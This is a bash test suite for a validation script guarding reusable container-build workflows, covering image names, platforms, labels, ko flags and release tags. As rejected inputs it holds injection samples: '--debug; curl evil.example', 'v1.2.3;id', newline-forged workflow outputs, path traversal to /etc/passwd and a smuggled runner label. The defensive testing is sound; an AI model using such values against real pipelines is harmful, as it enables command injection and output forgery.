# shellcheck shell=bash
#
# Tests for scripts/validate-inputs.sh, the trust boundary of the reusable
# workflows.
#
# The cases that matter most are the ones where accepting a value would be worse
# than rejecting it: a platform that maps to an attacker-chosen runner, a label
# carrying a newline that could forge a workflow output, an image pointing at a
# registry the caller did not name.

VALIDATE_SH="${REPO_ROOT}/scripts/validate-inputs.sh"

_v() { run bash "${VALIDATE_SH}" "$@"; }

## image

test_image_prepends_the_registry() {
  _v image ghcr.io thingzio/app
  assert_ok
  assert_stdout_eq "ghcr.io/thingzio/app"
}

test_image_accepts_a_single_path_component() {
  _v image ghcr.io app
  assert_ok
  assert_stdout_eq "ghcr.io/app"
}

test_image_accepts_a_deep_path() {
  _v image ghcr.io thingzio/group/sub/app
  assert_ok
  assert_stdout_eq "ghcr.io/thingzio/group/sub/app"
}

test_image_accepts_separators_the_oci_grammar_allows() {
  _v image ghcr.io thingzio/my-app_v2.beta
  assert_ok
  assert_stdout_eq "ghcr.io/thingzio/my-app_v2.beta"
}

test_image_accepts_a_registry_with_a_port() {
  _v image localhost:5000 thingzio/app
  assert_ok
  assert_stdout_eq "localhost:5000/thingzio/app"
}

# Writing the full reference is the natural mistake; accept it when it agrees.
test_image_strips_a_matching_registry_prefix() {
  _v image ghcr.io ghcr.io/thingzio/app
  assert_ok
  assert_stdout_eq "ghcr.io/thingzio/app"
}

# But never silently publish somewhere the caller did not name.
test_image_rejects_a_mismatched_registry_prefix() {
  _v image ghcr.io docker.io/thingzio/app
  assert_failed
  assert_stderr_contains "names registry 'docker.io'"
}

test_image_lowercases_an_uppercase_repository() {
  _v image ghcr.io Thingzio/App
  assert_ok
  assert_stdout_eq "ghcr.io/thingzio/app"
  assert_stderr_contains "lowercased"
}

test_image_rejects_an_embedded_tag() {
  _v image ghcr.io thingzio/app:v1
  assert_failed
  assert_stderr_contains "must not contain a tag"
}

test_image_rejects_an_embedded_digest() {
  _v image ghcr.io thingzio/app@sha256:abc
  assert_failed
  assert_stderr_contains "must not contain a digest"
}

test_image_rejects_a_newline() {
  _v image ghcr.io "$(printf 'thingzio/app\npush=true')"
  assert_failed
  assert_stderr_contains "must not contain a newline"
}

test_image_rejects_an_empty_value() {
  _v image ghcr.io ""
  assert_failed
  assert_stderr_contains "image is required"
}

test_image_rejects_a_leading_slash() {
  _v image ghcr.io /thingzio/app
  assert_failed
  assert_stderr_contains "not a valid OCI repository path"
}

test_image_rejects_a_trailing_slash() {
  _v image ghcr.io thingzio/app/
  assert_failed
  assert_stderr_contains "not a valid OCI repository path"
}

test_image_rejects_path_traversal() {
  _v image ghcr.io ../../etc/passwd
  assert_failed
  assert_stderr_contains "not a valid OCI repository path"
}

test_image_rejects_a_space() {
  _v image ghcr.io "thingzio/my app"
  assert_failed
  assert_stderr_contains "not a valid OCI repository path"
}

test_image_rejects_an_invalid_registry_host() {
  _v image "ghcr.io;evil" thingzio/app
  assert_failed
  assert_stderr_contains "not a valid host"
}

## platforms

test_platforms_maps_amd64_to_its_native_runner() {
  _v platforms linux/amd64
  assert_ok
  assert_stdout_eq '[{"platform":"linux/amd64","arch":"amd64","runner":"ubuntu-24.04"}]'
}

test_platforms_maps_arm64_to_a_native_arm_runner() {
  _v platforms linux/arm64
  assert_ok
  assert_stdout_eq '[{"platform":"linux/arm64","arch":"arm64","runner":"ubuntu-24.04-arm"}]'
}

test_platforms_handles_the_default_pair() {
  _v platforms linux/amd64,linux/arm64
  assert_ok
  assert_stdout_eq '[{"platform":"linux/amd64","arch":"amd64","runner":"ubuntu-24.04"},{"platform":"linux/arm64","arch":"arm64","runner":"ubuntu-24.04-arm"}]'
}

test_platforms_trims_whitespace() {
  _v platforms " linux/amd64 , linux/arm64 "
  assert_ok
  assert_contains "${RUN_OUT}" '"platform":"linux/amd64"'
  assert_contains "${RUN_OUT}" '"platform":"linux/arm64"'
}

test_platforms_removes_duplicates() {
  _v platforms linux/amd64,linux/amd64
  assert_ok
  assert_stdout_eq '[{"platform":"linux/amd64","arch":"amd64","runner":"ubuntu-24.04"}]'
}

test_platforms_preserves_caller_order() {
  _v platforms linux/arm64,linux/amd64
  assert_ok
  assert_contains "${RUN_OUT}" '[{"platform":"linux/arm64"'
}

# An unsupported platform must fail rather than fall back, because a fallback
# would have to pick a runner label and there is no safe default.
test_platforms_rejects_an_unsupported_platform() {
  _v platforms linux/s390x
  assert_failed
  assert_stderr_contains "unsupported platform 'linux/s390x'"
}

test_platforms_rejects_windows() {
  _v platforms windows/amd64
  assert_failed
  assert_stderr_contains "unsupported platform"
}

# The reason the mapping is a closed allowlist: anything that let a caller
# influence the runner label would let them point the trusted builder at a
# machine they control.
test_platforms_rejects_a_smuggled_runner_label() {
  _v platforms "linux/amd64,self-hosted"
  assert_failed
  assert_stderr_contains "unsupported platform"
}

test_platforms_rejects_an_empty_value() {
  _v platforms ""
  assert_failed
  assert_stderr_contains "platforms is required"
}

test_platforms_rejects_only_separators() {
  _v platforms ",,"
  assert_failed
  assert_stderr_contains "no usable platform"
}

test_platforms_rejects_a_newline() {
  _v platforms "$(printf 'linux/amd64\nlinux/s390x')"
  assert_failed
  assert_stderr_contains "must not contain a newline"
}

## kv (labels and build arguments)

test_kv_passes_through_a_valid_pair() {
  _v kv labels "org.opencontainers.image.title=app"
  assert_ok
  assert_stdout_eq "org.opencontainers.image.title=app"
}

test_kv_handles_multiple_lines() {
  _v kv labels "$(printf 'a=1\nb=2')"
  assert_ok
  assert_stdout_eq "a=1
b=2"
}

test_kv_trims_surrounding_whitespace() {
  _v kv labels "   a=1   "
  assert_ok
  assert_stdout_eq "a=1"
}

test_kv_skips_blank_lines() {
  _v kv labels "$(printf 'a=1\n\n\nb=2')"
  assert_ok
  assert_stdout_eq "a=1
b=2"
}

# A label value legitimately contains commas, so splitting on them would
# silently truncate a description.
test_kv_does_not_split_on_commas() {
  _v kv labels "org.opencontainers.image.description=one, two, three"
  assert_ok
  assert_stdout_eq "org.opencontainers.image.description=one, two, three"
}

test_kv_preserves_an_equals_sign_inside_the_value() {
  _v kv build_args "QUERY=a=b"
  assert_ok
  assert_stdout_eq "QUERY=a=b"
}

test_kv_accepts_an_empty_value() {
  _v kv build_args "EMPTY="
  assert_ok
  assert_stdout_eq "EMPTY="
}

test_kv_accepts_an_empty_input() {
  _v kv labels ""
  assert_ok
  assert_stdout_eq ""
}

test_kv_rejects_a_line_without_an_equals_sign() {
  _v kv labels "justakey"
  assert_failed
  assert_stderr_contains "not in key=value form"
}

test_kv_rejects_a_key_starting_with_a_digit() {
  _v kv labels "1bad=value"
  assert_failed
  assert_stderr_contains "must start with a letter or underscore"
}

test_kv_rejects_a_key_with_a_shell_metacharacter() {
  _v kv labels 'ev;il=value'
  assert_failed
  assert_stderr_contains "must start with a letter or underscore"
}

test_kv_rejects_a_key_containing_a_space() {
  _v kv labels "bad key=value"
  assert_failed
  assert_stderr_contains "must start with a letter or underscore"
}

test_kv_names_the_input_in_its_error() {
  _v kv build_args "oops"
  assert_failed
  assert_stderr_contains "build_args entry"
}

## ko-flags

test_ko_flags_accepts_an_image_user() {
  _v ko-flags "--image-user=65532"
  assert_ok
  assert_stdout_eq "--image-user=65532"
}

test_ko_flags_accepts_an_annotation() {
  _v ko-flags "--image-annotation=org.opencontainers.image.vendor=thingzio"
  assert_ok
  assert_stdout_eq "--image-annotation=org.opencontainers.image.vendor=thingzio"
}

test_ko_flags_accepts_several_flags() {
  _v ko-flags "--debug --disable-optimizations"
  assert_ok
  assert_stdout_eq "--debug
--disable-optimizations"
}

test_ko_flags_accepts_an_empty_value() {
  _v ko-flags ""
  assert_ok
  assert_stdout_eq ""
}

test_ko_flags_rejects_a_non_numeric_image_user() {
  _v ko-flags "--image-user=root"
  assert_failed
  assert_stderr_contains "is not allowed"
}

# --platform would let a caller build for an architecture whose runner was never
# allowlisted, which is exactly what the platforms allowlist exists to prevent.
test_ko_flags_rejects_platform() {
  _v ko-flags "--platform=all"
  assert_failed
  assert_stderr_contains "is not allowed"
}

test_ko_flags_rejects_a_push_redirect() {
  _v ko-flags "--push=false"
  assert_failed
  assert_stderr_contains "is not allowed"
}

test_ko_flags_rejects_an_unknown_flag() {
  _v ko-flags "--rm-rf"
  assert_failed
  assert_stderr_contains "is not allowed"
}

test_ko_flags_rejects_a_bare_word() {
  _v ko-flags "evil"
  assert_failed
  assert_stderr_contains "is not allowed"
}

test_ko_flags_rejects_a_shell_metacharacter() {
  _v ko-flags '--debug; curl evil.example'
  assert_failed
  assert_stderr_contains "is not allowed"
}

## dispatch

test_unknown_command_shows_usage() {
  _v nonsense
  assert_rc 2
  assert_stderr_contains "usage:"
}

test_no_command_shows_usage() {
  _v
  assert_rc 2
  assert_stderr_contains "usage:"
}

test_wrong_argument_count_shows_usage() {
  _v image ghcr.io
  assert_rc 2
  assert_stderr_contains "usage:"
}

## release-tag

test_release_tag_accepts_a_semver_tag() {
  _v release-tag v1.2.3
  assert_ok
  assert_stdout_eq "1.2.3"
}

test_release_tag_strips_the_leading_v() {
  _v release-tag v0.1.0
  assert_ok
  assert_stdout_eq "0.1.0"
}

test_release_tag_accepts_a_prerelease() {
  _v release-tag v1.2.3-rc.1
  assert_ok
  assert_stdout_eq "1.2.3-rc.1"
}

test_release_tag_accepts_build_metadata() {
  _v release-tag v1.2.3+build.5
  assert_ok
  assert_stdout_eq "1.2.3+build.5"
}

# A release built from a branch would publish provenance naming a ref that
# moves, so a verifier could not tell which tree it described.
test_release_tag_rejects_a_branch_name() {
  _v release-tag main
  assert_failed
}

test_release_tag_rejects_a_tag_without_the_v() {
  _v release-tag 1.2.3
  assert_failed
}

test_release_tag_rejects_a_two_component_version() {
  _v release-tag v1.2
  assert_failed
}

test_release_tag_rejects_a_non_numeric_component() {
  _v release-tag v1.2.x
  assert_failed
}

test_release_tag_rejects_a_letters_only_version() {
  _v release-tag vx.y.z
  assert_failed
}

# A newline could forge a second workflow output, which is how a validated
# value becomes an injection.
test_release_tag_rejects_a_newline() {
  _v release-tag "v1.2.3
version=0.0.0-evil"
  assert_failed
}

test_release_tag_rejects_shell_metacharacters() {
  _v release-tag 'v1.2.3;id'
  assert_failed
}

test_release_tag_rejects_an_empty_value() {
  _v release-tag ""
  assert_failed
}

## release-tag-prerelease

test_release_tag_prerelease_is_false_for_a_release() {
  _v release-tag-prerelease v1.2.3
  assert_ok
  assert_stdout_eq "false"
}

test_release_tag_prerelease_is_true_for_a_candidate() {
  _v release-tag-prerelease v1.2.3-rc.1
  assert_ok
  assert_stdout_eq "true"
}

# Build metadata is not a prerelease: v1.2.3+build.5 is still a release.
test_release_tag_prerelease_ignores_build_metadata() {
  _v release-tag-prerelease v1.2.3+build.5
  assert_ok
  assert_stdout_eq "false"
}

test_release_tag_prerelease_rejects_an_invalid_tag() {
  _v release-tag-prerelease main
  assert_failed
}
